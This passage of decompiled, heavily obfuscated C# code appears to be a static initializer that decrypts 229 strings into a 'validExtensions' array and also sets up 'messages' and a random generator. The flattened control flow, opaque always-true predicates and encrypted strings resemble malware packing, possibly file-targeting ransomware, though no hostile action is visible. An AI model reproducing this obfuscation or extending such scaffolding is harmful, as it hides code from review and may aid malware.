									case 95:
										array2[133] = Class0.smethod_11(796);
										array = (string[])185;
										goto case 185;
									case 79:
										array2[217] = Class0.smethod_11(1132);
										array = (string[])58;
										if (!smethod_2())
										{
											continue;
										}
										goto IL_1a45;
									case 78:
										array2[162] = Class0.smethod_11(912);
										array = (string[])96;
										goto case 96;
									case 71:
										array2[5] = Class0.smethod_11(288);
										array2[6] = Class0.smethod_11(292);
										goto case 139;
									case 64:
										array2[69] = Class0.smethod_11(540);
										array2[70] = Class0.smethod_11(544);
										array = (string[])29;
										goto case 29;
									case 29:
										array2[71] = Class0.smethod_11(548);
										goto case 203;
									case 61:
										array2[161] = Class0.smethod_11(908);
										array = (string[])78;
										if (!smethod_1())
										{
											goto case 56;
										}
										goto case 78;
									case 58:
										array2[218] = Class0.smethod_11(1136);
										array = (string[])267;
										goto case 267;
									case 30:
										array2[160] = Class0.smethod_11(904);
										array = (string[])61;
										goto case 61;
									case 27:
										array2 = new string[229];
										goto case 174;
									default:
										array = (string[])221;
										goto IL_0ec4;
									case 76:
										goto IL_1a06;
									case 107:
										goto IL_1a2c;
									case 225:
										goto IL_1a45;
									case 21:
										goto IL_1a55;
									case 205:
										goto IL_1a65;
									case 156:
										goto IL_1a75;
									case 162:
										goto IL_1a8e;
									case 235:
										goto IL_1a9e;
									case 216:
										goto IL_1ac1;
									case 208:
										goto IL_1ada;
									case 163:
										goto IL_1b07;
									case 248:
										goto IL_1b2e;
									case 47:
										goto IL_1b3e;
									case 19:
										goto IL_1b57;
									case 82:
										goto IL_1b67;
									case 196:
										goto IL_1b80;
									case 18:
										goto IL_1b99;
									case 69:
										goto IL_1bb7;
									case 87:
										goto IL_1bcf;
									case 122:
										goto IL_1be2;
									case 211:
										goto IL_1bec;
									case 7:
										goto IL_1bfb;
									case 149:
										goto IL_1c25;
									case 142:
										goto IL_1c38;
									case 169:
										goto IL_1c55;
									case 26:
										goto IL_1c6d;
									case 136:
										goto IL_1c80;
									case 40:
										goto IL_1c9f;
									case 63:
										goto IL_1cc3;
									case 10:
										goto IL_1cd4;
									case 134:
										goto IL_1ce5;
									case 112:
										goto IL_1cf6;
									case 41:
										goto IL_1d07;
									case 244:
									case 263:
										goto IL_1d18;
									case 201:
										goto IL_1d29;
									case 118:
										goto IL_1d42;
									case 207:
										goto IL_1d64;
									case 62:
										goto IL_1d7b;
									case 184:
										goto IL_1d96;
									case 5:
										goto IL_1da7;
									case 144:
										goto IL_1daf;
									case 234:
										goto IL_1dc9;
									case 50:
										goto IL_1dda;
									case 191:
										goto IL_1df4;
									case 194:
										goto IL_1e06;
									case 219:
										goto IL_1e0e;
									case 14:
										goto IL_1e16;
									case 237:
										goto IL_1e30;
									case 73:
										goto IL_1e50;
									case 114:
										goto IL_1e6a;
									case 80:
										goto end_IL_1e6a;
									case 22:
										goto end_IL_1e85;
									case 102:
										goto end_IL_1e9f;
									case 72:
										goto end_IL_1ea7;
									case 52:
										goto end_IL_1ec1;
									case 167:
										goto IL_1eec;
									case 24:
									case 268:
										return;
									}
									break;
								}
								goto IL_0070;
								IL_0ec4:
								array2[83] = Class0.smethod_11(596);
								goto IL_051a;
								IL_0940:
								array2[129] = Class0.smethod_11(780);
								array2[130] = Class0.smethod_11(784);
								array = (string[])182;
								if (!smethod_2())
								{
									goto IL_0975;
								}
								goto IL_1cc3;
								IL_0975:
								array2[131] = Class0.smethod_11(788);
								array = (string[])101;
								goto IL_098f;
								IL_098f:
								array2[132] = Class0.smethod_11(792);
								array = (string[])95;
								if (smethod_2())
								{
									goto IL_0070;
								}
								goto IL_15c4;
								IL_0697:
								messages = array;
								array = (string[])27;
								if (smethod_2())
								{
									goto IL_06b0;
								}
								goto IL_15c4;
								IL_06b0:
								array2[36] = Class0.smethod_11(408);
								goto IL_06be;
								IL_06be:
								array2[37] = Class0.smethod_11(412);
								array = (string[])210;
								goto IL_06d5;
								IL_06d5:
								array2[38] = Class0.smethod_11(416);
								goto IL_06e3;
								IL_06e3:
								array2[39] = Class0.smethod_11(420);
								array = (string[])247;
								goto IL_06fa;
								IL_06fa:
								array2[40] = Class0.smethod_11(424);
								array = (string[])259;
								goto IL_0711;
								IL_0711:
								array2[41] = Class0.smethod_11(428);
								goto IL_071f;
								IL_071f:
								array2[42] = Class0.smethod_11(432);
								array = (string[])251;
								goto IL_0736;
								IL_0736:
								array2[43] = Class0.smethod_11(436);
								array = (string[])192;
								goto IL_074d;
								IL_074d:
								array2[44] = Class0.smethod_11(440);
								goto IL_0395;
								IL_0658:
								array2[180] = Class0.smethod_11(984);
								array = (string[])168;
								goto IL_01d7;
								IL_01d7:
								array2[181] = Class0.smethod_11(988);
								array2[182] = Class0.smethod_11(992);
								array = (string[])34;
								goto IL_0202;
								IL_0202:
								array2[183] = Class0.smethod_11(996);
								array = (string[])45;
								goto IL_021c;
								IL_021c:
								array2[184] = Class0.smethod_11(1000);
								goto IL_0376;
								IL_0376:
								array2[185] = Class0.smethod_11(1004);
								array = (string[])44;
								goto IL_0232;
								IL_0232:
								array2[186] = Class0.smethod_11(1008);
								goto IL_0243;
								IL_0243:
								array2[187] = Class0.smethod_11(1012);
								array = (string[])68;
								goto IL_025d;
								IL_025d:
								array2[188] = Class0.smethod_11(1016);
								goto IL_026e;
								IL_026e:
								array2[189] = Class0.smethod_11(1020);
								array2[190] = Class0.smethod_11(1024);
								array = (string[])231;
								goto IL_0299;
								IL_0299:
								array2[191] = Class0.smethod_11(1028);
								array = (string[])99;
								goto IL_02b3;
								IL_02b3:
								array2[192] = Class0.smethod_11(1032);
								goto IL_02c4;
								IL_02c4:
								array2[193] = Class0.smethod_11(1036);
								goto IL_02d5;
								IL_02d5:
								array2[194] = Class0.smethod_11(1040);
								array = (string[])85;
								goto IL_02ef;
								IL_02ef:
								array2[195] = Class0.smethod_11(1044);
								array = (string[])20;
								goto IL_0309;
								IL_0309:
								array2[196] = Class0.smethod_11(1048);
								array = (string[])117;
								goto IL_0323;
								IL_0323:
								array2[197] = Class0.smethod_11(1052);
								array = (string[])165;
								if (smethod_1())
								{
									goto IL_0344;
								}
								goto IL_0395;
								IL_0344:
								array2[198] = Class0.smethod_11(1056);
								array2[199] = Class0.smethod_11(1060);
								array = (string[])74;
								if (!smethod_1())
								{
									goto IL_0376;
								}
								goto IL_03b1;
								IL_03b1:
								array2[200] = Class0.smethod_11(1064);
								array = (string[])228;
								goto IL_05d9;
								IL_0395:
								array2[45] = Class0.smethod_11(444);
								array = (string[])8;
								goto IL_05aa;
								IL_05aa:
								array2[46] = Class0.smethod_11(448);
								array2[47] = Class0.smethod_11(452);
								array = (string[])173;
								if (smethod_2())
								{
									goto IL_05d9;
								}
								goto IL_15c4;
								IL_05d9:
								array2[201] = Class0.smethod_11(1068);
								array2[202] = Class0.smethod_11(1072);
								array = (string[])4;
								goto IL_03d0;
								IL_03d0:
								array2[203] = Class0.smethod_11(1076);
								array2[204] = Class0.smethod_11(1080);
								array = (string[])148;
								if (smethod_1())
								{
									goto IL_0405;
								}
								goto IL_0609;
								IL_0405:
								array2[205] = Class0.smethod_11(1084);
								array2[206] = Class0.smethod_11(1088);
								array = (string[])190;
								goto IL_0430;
								IL_0430:
								array2[207] = Class0.smethod_11(1092);
								goto IL_0441;
								IL_0441:
								array2[208] = Class0.smethod_11(1096);
								goto IL_0452;
								IL_0452:
								array2[209] = Class0.smethod_11(1100);
								array = (string[])67;
								goto IL_046c;
								IL_046c:
								array2[210] = Class0.smethod_11(1104);
								array = (string[])161;
								goto IL_0486;
								IL_0486:
								array2[211] = Class0.smethod_11(1108);
								array = (string[])249;
								goto IL_04a0;
								IL_04a0:
								array2[212] = Class0.smethod_11(1112);
								array2[213] = Class0.smethod_11(1116);
								array = (string[])233;
								goto IL_04cb;
								IL_04cb:
								array2[214] = Class0.smethod_11(1120);
								array2[215] = Class0.smethod_11(1124);
								array = (string[])145;
								goto IL_04f6;
								IL_04f6:
								array2[216] = Class0.smethod_11(1128);
								array = (string[])79;
								if (smethod_2())
								{
									goto IL_051a;
								}
								goto IL_15c4;
								IL_051a:
								array2[84] = Class0.smethod_11(600);
								goto IL_0528;
								IL_0528:
								array2[85] = Class0.smethod_11(604);
								array = (string[])108;
								goto IL_053f;
								IL_053f:
								array2[86] = Class0.smethod_11(608);
								array = (string[])6;
								goto IL_0556;
								IL_0556:
								array2[87] = Class0.smethod_11(612);
								array = (string[])15;
								goto IL_056d;
								IL_056d:
								array2[88] = Class0.smethod_11(616);
								goto IL_057b;
								IL_057b:
								array2[89] = Class0.smethod_11(620);
								goto IL_0589;
								IL_0589:
								array2[90] = Class0.smethod_11(624);
								array = (string[])159;
								if (!smethod_1())
								{
									goto IL_05aa;
								}
								goto IL_15c4;
								IL_0609:
								array2[157] = Class0.smethod_11(892);
								array = (string[])1;
								goto IL_0623;
								IL_0623:
								array2[158] = Class0.smethod_11(896);
								goto IL_0634;
								IL_0634:
								array2[159] = Class0.smethod_11(900);
								array = (string[])30;
								if (smethod_2())
								{
									goto IL_0658;
								}
								goto IL_15c4;
								IL_0070:
								array2[222] = Class0.smethod_11(1152);
								array = (string[])187;
								if (!smethod_2())
								{
									goto IL_0094;
								}
								goto IL_1a55;
								IL_0094:
								array2[223] = Class0.smethod_11(712);
								array = (string[])10;
								if (smethod_2())
								{
									goto IL_00b8;
								}
								goto IL_1cd4;
								IL_00b8:
								array2[98] = Class0.smethod_11(656);
								array = (string[])160;
								goto IL_00cf;
								IL_00cf:
								array2[99] = Class0.smethod_11(660);
								array = (string[])86;
								goto IL_00e6;
								IL_00e6:
								array2[100] = Class0.smethod_11(664);
								array = (string[])214;
								goto IL_00fd;
								IL_00fd:
								array2[101] = Class0.smethod_11(668);
								array = (string[])242;
								goto IL_0114;
								IL_0114:
								array2[102] = Class0.smethod_11(672);
								goto IL_0122;
								IL_0122:
								array2[103] = Class0.smethod_11(676);
								array = (string[])60;
								goto IL_0139;
								IL_0139:
								array2[104] = Class0.smethod_11(680);
								array = (string[])195;
								goto IL_0150;
								IL_0150:
								array2[105] = Class0.smethod_11(684);
								array = (string[])135;
								goto IL_0167;
								IL_0167:
								array2[106] = Class0.smethod_11(688);
								array = (string[])217;
								if (!smethod_2())
								{
									goto IL_15c4;
								}
								goto IL_1dc9;
								IL_1cd4:
								array2[224] = Class0.smethod_11(1156);
								goto IL_1ce5;
								IL_1ce5:
								array2[225] = Class0.smethod_11(1160);
								goto IL_1cf6;
								IL_1cf6:
								array2[226] = Class0.smethod_11(1164);
								goto IL_1d07;
								IL_1d07:
								array2[227] = Class0.smethod_11(1168);
								goto IL_1d18;
								IL_1d18:
								array2[228] = Class0.smethod_11(1172);
								goto IL_1d29;
								IL_1d29:
								validExtensions = array2;
								array = (string[])167;
								if (!smethod_1())
								{
									goto IL_1d42;
								}
								goto IL_1eec;
								IL_1eec:
								random = new Random();
								array = (string[])268;
								return;
								continue;
								end_IL_1e6a:
								break;
							}
							continue;
							end_IL_1e85:
							break;
						}
						continue;
						end_IL_1e9f:
						break;
					}
					continue;
					end_IL_1ea7:
					break;
				}
				continue;
				end_IL_1ec1:
				break;
			}
		}
	}

	internal static bool smethod_1()
	{
		return true;
	}

	internal static bool smethod_2()
	{
		return true;
	}
}
